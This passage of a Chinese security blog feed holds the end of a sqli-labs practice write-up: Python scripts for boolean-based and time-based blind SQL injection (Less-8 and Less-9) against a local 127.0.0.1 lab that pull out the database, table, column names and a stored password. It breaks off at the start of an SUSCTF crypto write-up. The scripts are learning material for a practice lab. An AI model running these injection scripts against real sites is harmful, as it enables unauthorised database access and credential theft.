class="hljs-number">1</span>):<br>        left=<span class="hljs-number">32</span><br>        right=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">while</span> left&lt;right:<br>            mid=(left+right)//<span class="hljs-number">2</span><br>            payload=url+<span class="hljs-string">f&quot;?id=1\&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-subst">&#123;index&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>            response=get(payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                left=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right=mid<br>        judge=url+<span class="hljs-string">f&quot;?id=1\&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-subst">&#123;index&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1)=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>        response=get(judge)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            mid=left<br>        <span class="hljs-keyword">else</span>:<br>            mid=right<br>        table_name+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-keyword">return</span> table_name <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_column_name</span>(<span class="hljs-params">url,index1,index2</span>):</span>          <span class="hljs-comment">#获取数据库第index1个表的第index2个字段的长度</span><br>    column_len=get_column_len(url,index1,index2)<br>    table_name=get_table_name(url,index1)<br>    column_name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,column_len+<span class="hljs-number">1</span>):<br>        left=<span class="hljs-number">32</span><br>        right=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">while</span> left&lt;right:<br>            mid=(left+right)//<span class="hljs-number">2</span><br>            payload=url+<span class="hljs-string">f&quot;?id=1\&quot; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27; limit <span class="hljs-subst">&#123;index2&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>            response=get(payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                left=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right=mid<br>        judge=url+<span class="hljs-string">f&quot;?id=1\&quot; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27; limit <span class="hljs-subst">&#123;index2&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>        response=get(judge)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            mid=left<br>        <span class="hljs-keyword">else</span>:<br>            mid=right<br>        column_name+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-keyword">return</span> column_name <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>(<span class="hljs-params">url,index1,index2,index3</span>):</span>      <span class="hljs-comment">#获取数据库第index1个表的第index2个字段的第index3个数据</span><br>    data_len=get_data_len(url,index1,index2,index3)<br>    column_name=get_column_name(url,index1,index2)<br>    table_name=get_table_name(url,index1)<br>    data=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,data_len+<span class="hljs-number">1</span>):<br>        left=<span class="hljs-number">32</span><br>        right=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">while</span> left&lt;right:<br>            mid=(left+right)//<span class="hljs-number">2</span><br>            payload=url+<span class="hljs-string">f&quot;?id=1\&quot; and ascii(substr((select <span class="hljs-subst">&#123;column_name&#125;</span> from <span class="hljs-subst">&#123;table_name&#125;</span> limit <span class="hljs-subst">&#123;index3&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>%23&quot;</span><br>            response=get(payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                left=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right=mid<br>        judge=url+<span class="hljs-string">f&quot;?id=1\&quot; and ascii(substr((select <span class="hljs-subst">&#123;column_name&#125;</span> from <span class="hljs-subst">&#123;table_name&#125;</span> limit <span class="hljs-subst">&#123;index3&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>%23&quot;</span><br>        response=get(judge)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            mid=left<br>        <span class="hljs-keyword">else</span>:<br>            mid=right<br>        data+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-keyword">return</span> data<br><br>index1=<span class="hljs-number">3</span><br>index2=<span class="hljs-number">2</span><br>index3=<span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(get_db_name(url,get_db_len(url)))<br><span class="hljs-built_in">print</span>(get_table_name(url,index1))<br><span class="hljs-built_in">print</span>(get_column_name(url,index1,index2))<br><span class="hljs-built_in">print</span>(get_data(url,index1,index2,index3))<br><span class="hljs-string">&#x27;&#x27;&#x27;security</span><br><span class="hljs-string">users</span><br><span class="hljs-string">password</span><br><span class="hljs-string">p@ssword</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="less-9"><a href="#less-9" class="headerlink" title="less 9"></a>less 9</h2><p>时间盲注，大致思路与布尔盲注差不多，只需要修改一下payload就行，脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><br>url=<span class="hljs-string">&quot;http://127.0.0.1/Less-9/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_db_len</span>(<span class="hljs-params">url</span>):</span>            <span class="hljs-comment">#获取当前数据库长度</span><br>    left=<span class="hljs-number">0</span><br>    right=<span class="hljs-number">100</span><br>    <span class="hljs-keyword">while</span> left&lt;right:<br>        mid=(left+right)//<span class="hljs-number">2</span><br>        payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(length(database())&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(0.1),0)%23&quot;</span><br>        before=time()<br>        response=get(payload)<br>        after=time()<br>        <span class="hljs-keyword">if</span> after-before&gt;=<span class="hljs-number">0.1</span>:<br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>    t1=time()<br>    judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(length(database())=<span class="hljs-subst">&#123;left&#125;</span>,sleep(0.1),0)%23&quot;</span><br>    response=get(judge)<br>    t2=time()<br>    <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>        mid=left<br>    <span class="hljs-keyword">else</span>:<br>        mid=right<br>    <span class="hljs-keyword">return</span> mid<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_table_len</span>(<span class="hljs-params">url,index</span>):</span>   <span class="hljs-comment">#获取当前数据库第index个表的长度</span><br>    left=<span class="hljs-number">0</span><br>    right=<span class="hljs-number">100</span><br>    <span class="hljs-keyword">while</span> left&lt;right:<br>        mid=(left+right)//<span class="hljs-number">2</span><br>        t1=time()<br>        payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-subst">&#123;index&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(0.1),0)%23&quot;</span><br>        response=get(payload)<br>        t2=time()<br>        <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>    t1=time()<br>    judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-subst">&#123;index&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>,sleep(0.1),0)%23&quot;</span><br>    response=get(judge)<br>    t2=time()<br>    <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>        mid=left<br>    <span class="hljs-keyword">else</span>:<br>        mid=right<br>    <span class="hljs-keyword">return</span> mid<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_column_len</span>(<span class="hljs-params">url,index1,index2</span>):</span>   <span class="hljs-comment">#获取数据库第index1个表的第index2个字段的长度 </span><br>    left=<span class="hljs-number">0</span><br>    right=<span class="hljs-number">100</span><br>    table_name=get_table_name(url,index1)<br>    <span class="hljs-keyword">while</span> left&lt;right:<br>        mid=(left+right)//<span class="hljs-number">2</span><br>        t1=time()<br>        payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(length((select column_name from information_schema.columns where table_name=&#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27; limit <span class="hljs-subst">&#123;index2&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(0.1),0)%23&quot;</span><br>        response=get(payload)<br>        t2=time()<br>        <span class="hljs-keyword">if</span> t2-t1:<br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>    t1=time()<br>    judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(length((select column_name from information_schema.columns where table_name=&#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27; limit <span class="hljs-subst">&#123;index2&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>,sleep(0.1),0)%23&quot;</span><br>    response=get(judge)<br>    t2=time()<br>    <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>        mid=left<br>    <span class="hljs-keyword">else</span>:<br>        mid=right<br>    <span class="hljs-keyword">return</span> mid<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data_len</span>(<span class="hljs-params">url,index1,index2,index3</span>):</span>       <span class="hljs-comment">##获取数据库第index1个表的第index2个字段的第index3个数据</span><br>    table_name=get_table_name(url,index1)<br>    column_name=get_column_name(url,index1,index2)<br>    left=<span class="hljs-number">0</span><br>    right=<span class="hljs-number">100</span><br>    <span class="hljs-keyword">while</span> left&lt;right:<br>        mid=(left+right)//<span class="hljs-number">2</span><br>        t1=time()<br>        payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(length((select <span class="hljs-subst">&#123;column_name&#125;</span> from <span class="hljs-subst">&#123;table_name&#125;</span> limit <span class="hljs-subst">&#123;index3&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(0.1),0)%23&quot;</span><br>        response=get(payload)<br>        t2=time()<br>        <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>    t1=time()<br>    judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(length((select <span class="hljs-subst">&#123;column_name&#125;</span> from <span class="hljs-subst">&#123;table_name&#125;</span> limit <span class="hljs-subst">&#123;index3&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>,sleep(0.1),0)%23&quot;</span><br>    response=get(judge)<br>    t2=time()<br>    <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>        mid=left<br>    <span class="hljs-keyword">else</span>:<br>        mid=right<br>    <span class="hljs-keyword">return</span> mid<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_db_name</span>(<span class="hljs-params">url,db_len</span>):</span>           <span class="hljs-comment">#获取当前数据库名</span><br>    db_name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,db_len+<span class="hljs-number">1</span>):<br>        left=<span class="hljs-number">32</span><br>        right=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">while</span> left&lt;right:<br>            mid=(left+right)//<span class="hljs-number">2</span><br>            t1=time()<br>            payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(ascii(substr((select database()),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(0.1),0)%23&quot;</span><br>            response=get(payload)<br>            t2=time()<br>            <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>                left=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right=mid<br>        t1=time()<br>        judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(ascii(substr((select database()),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>,sleep(0,1),0)%23&quot;</span><br>        response=get(judge)<br>        t2=time()<br>        <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>            mid=left<br>        <span class="hljs-keyword">else</span>:<br>            mid=right<br>        db_name+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-keyword">return</span> db_name<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_table_name</span>(<span class="hljs-params">url,index</span>):</span>           <span class="hljs-comment">#获取第index个数据表表名</span><br>    table_len=get_table_len(url,index)<br>    table_name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,table_len+<span class="hljs-number">1</span>):<br>        left=<span class="hljs-number">32</span><br>        right=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">while</span> left&lt;right:<br>            mid=(left+right)//<span class="hljs-number">2</span><br>            t1=time()<br>            payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-subst">&#123;index&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(0.1),0)%23&quot;</span><br>            response=get(payload)<br>            t2=time()<br>            <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>                left=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right=mid<br>        t1=time()<br>        judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-subst">&#123;index&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1)=<span class="hljs-subst">&#123;left&#125;</span>,sleep(0.1),0)%23&quot;</span><br>        response=get(judge)<br>        t2=time()<br>        <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>            mid=left<br>        <span class="hljs-keyword">else</span>:<br>            mid=right<br>        table_name+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-keyword">return</span> table_name <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_column_name</span>(<span class="hljs-params">url,index1,index2</span>):</span>          <span class="hljs-comment">#获取数据库第index1个表的第index2个字段的长度</span><br>    column_len=get_column_len(url,index1,index2)<br>    table_name=get_table_name(url,index1)<br>    column_name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,column_len+<span class="hljs-number">1</span>):<br>        left=<span class="hljs-number">32</span><br>        right=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">while</span> left&lt;right:<br>            mid=(left+right)//<span class="hljs-number">2</span><br>            t1=time()<br>            payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27; limit <span class="hljs-subst">&#123;index2&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(0.1),0)%23&quot;</span><br>            response=get(payload)<br>            t2=time()<br>            <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>                left=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right=mid<br>        t1=time()<br>        judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27; limit <span class="hljs-subst">&#123;index2&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>,sleep(0.1),0)%23&quot;</span><br>        response=get(judge)<br>        t2=time()<br>        <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>            mid=left<br>        <span class="hljs-keyword">else</span>:<br>            mid=right<br>        column_name+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-keyword">return</span> column_name <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>(<span class="hljs-params">url,index1,index2,index3</span>):</span>      <span class="hljs-comment">#获取数据库第index1个表的第index2个字段的第index3个数据</span><br>    data_len=get_data_len(url,index1,index2,index3)<br>    column_name=get_column_name(url,index1,index2)<br>    table_name=get_table_name(url,index1)<br>    data=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,data_len+<span class="hljs-number">1</span>):<br>        left=<span class="hljs-number">32</span><br>        right=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">while</span> left&lt;right:<br>            mid=(left+right)//<span class="hljs-number">2</span><br>            t1=time()<br>            payload=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(ascii(substr((select <span class="hljs-subst">&#123;column_name&#125;</span> from <span class="hljs-subst">&#123;table_name&#125;</span> limit <span class="hljs-subst">&#123;index3&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(0.1),0)%23&quot;</span><br>            response=get(payload)<br>            t2=time()<br>            <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>                left=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right=mid<br>        t1=time()<br>        judge=url+<span class="hljs-string">f&quot;?id=1&#x27; and if(ascii(substr((select <span class="hljs-subst">&#123;column_name&#125;</span> from <span class="hljs-subst">&#123;table_name&#125;</span> limit <span class="hljs-subst">&#123;index3&#125;</span>,1),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;left&#125;</span>,sleep(0.1),0)%23&quot;</span><br>        response=get(judge)<br>        t2=time()<br>        <span class="hljs-keyword">if</span> t2-t1&gt;=<span class="hljs-number">0.1</span>:<br>            mid=left<br>        <span class="hljs-keyword">else</span>:<br>            mid=right<br>        data+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-keyword">return</span> data<br><br>index1=<span class="hljs-number">3</span><br>index2=<span class="hljs-number">2</span><br>index3=<span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(get_db_name(url,get_db_len(url)))<br><span class="hljs-built_in">print</span>(get_table_name(url,index1))<br><span class="hljs-built_in">print</span>(get_column_name(url,index1,index2))<br><span class="hljs-built_in">print</span>(get_data(url,index1,index2,index3))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">security</span><br><span class="hljs-string">users</span><br><span class="hljs-string">password                 </span><br><span class="hljs-string">p@ssword</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>sqli-lab的初步学习暂时就到这里，等以后学深了再学一学后面的cookie注入和二次注入吧。sql注入的入门暂时告一段落，接下来还会推出SSTI,XSS,XXE等靶场的入门文章。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>web</category>
      
      <category>靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SUSCTF-Crypto方向所有赛题</title>
    <link href="/2022/03/02/Writeup%20of%20SUSCTF/"/>
    <url>/2022/03/02/Writeup%20of%20SUSCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="Special-Curve3"><a href="#Special-Curve3" class="headerlink" title="Special Curve3"></a>Special Curve3</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>看到SpecialCurve3这个名字，不禁想起西湖论剑的SpecialCurve2，想这两个应该有什么关系，于是打开<a href="https://zhuanlan.zhihu.com/p/436496753">春乎</a>找到他当时赛后写的复盘，了解到有.log这个能算自己定义的群的离散对数的逆天函数。审查题目，自己定义了一个曲线和它的群操作，一开始以为能用edwards曲线变换和Montgomery形式的变换映射到熟悉的椭圆曲线，然而失败了，报了些奇奇怪怪的错误，遂Google，以“圆锥曲线加密”为关键字找到了<a href="https://www.jiamisoft.com/blog/4068-yuanzhuiquxianjiamisuanfa.html">这篇文章</a>，按照文章所述以及题目的信息，知道前两个curve是论文所提到的两种不安全的曲线，按照文章依葫芦画瓢，再借助春乎的.log函数，整出前两关，得到e1,e2。第三关选择了“安全”的参数，即勒让德符号为-1，怀疑p有问题（不然真就无解了），尝试分解p-1,p+1,p^ 2+1,p ^ 2-1等，发现p+1光滑，于是猜测群的阶为p+1，仿照安全客这篇讲Pohlig Hellman的<a href="https://www.anquanke.com/post/id/159893">文章</a>，对p+1的因子求离散对数再CRT合并得到e3，由于勒让德符号为-1，不能构造映射用.log，因此爆破每一个因子求离散对数，获得flag。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 